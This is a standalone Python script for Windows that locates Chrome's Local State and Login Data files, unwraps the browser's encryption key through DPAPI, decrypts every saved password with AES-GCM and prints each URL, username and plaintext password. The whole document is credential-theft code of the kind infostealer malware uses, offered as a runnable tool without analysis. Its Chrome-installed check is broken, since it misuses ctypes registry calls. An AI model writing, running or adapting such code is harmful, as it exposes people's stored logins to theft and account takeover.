import os
import json
import sqlite3
import base64
import shutil
import ctypes
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from win32crypt import CryptUnprotectData
from ctypes.wintypes import MAX_PATH

def is_chrome_installed():
    chrome_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
    try:
        with ctypes.WinDLL('Advapi32.dll').RegOpenKeyExW(
            ctypes.HKEY_LOCAL_MACHINE,
            chrome_path,
            0,
            ctypes.KEY_READ
        ) as hKey:
            return True
    except FileNotFoundError:
        return False

def find_local_state():
    user_profile = os.environ.get("USERPROFILE")
    if not user_profile:
        print("Error getting user path.")
        return ""
    
    local_state_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Local State")
    print(f"Full path to Local State file: {local_state_path}")
    return local_state_path

def find_login_data():
    user_profile = os.environ.get("USERPROFILE")
    if not user_profile:
        print("Error getting user path.")
        return ""
    
    login_data_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
    print(f"Full path to Login Data file: {login_data_path}")
    return login_data_path

def get_encrypted_key(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)
        encrypted_key = local_state["os_crypt"]["encrypted_key"]
        return encrypted_key
    except (FileNotFoundError, KeyError) as e:
        print(f"Error: {e}")
        return ""

def decrypt_key(encrypted_key):
    encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove "DPAPI" prefix
    decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def login_data_parser(login_data_path, decryption_key):
    try:
        temp_login_data_path = login_data_path + 'a'
        shutil.copyfile(login_data_path, temp_login_data_path)
        
        conn = sqlite3.connect(temp_login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins")

        for row in cursor.fetchall():
            origin_url, username_value, encrypted_password, blacklisted_by_user = row
            if origin_url and username_value and not blacklisted_by_user:
                iv = encrypted_password[3:15]
                encrypted_password = encrypted_password[15:]
                
                cipher = AES.new(decryption_key, AES.MODE_GCM, iv)
                decrypted_password = cipher.decrypt(encrypted_password).decode('utf-8')
                
                print(f"Origin URL: {origin_url}")
                print(f"Username Value: {username_value}")
                print(f"Password: {decrypted_password}")
                print("----------------------------------")
        
        conn.close()
        os.remove(temp_login_data_path)
        return 0
    except sqlite3.Error as e:
        print(f"SQL error: {e}")
        return 1

def main():
    if os.name == 'nt':

        if is_chrome_installed():
            print("Google Chrome is installed.")
            local_state_path = find_local_state()
            login_data_path = find_login_data()

            encrypted_key = get_encrypted_key(local_state_path)
            decryption_key = decrypt_key(encrypted_key)

            login_data_parser(login_data_path, decryption_key)
        else:
            print("Google Chrome is not installed. Shutting down.")
    else:
        print("This program only runs on Windows systems.")

if __name__ == "__main__":
    main()
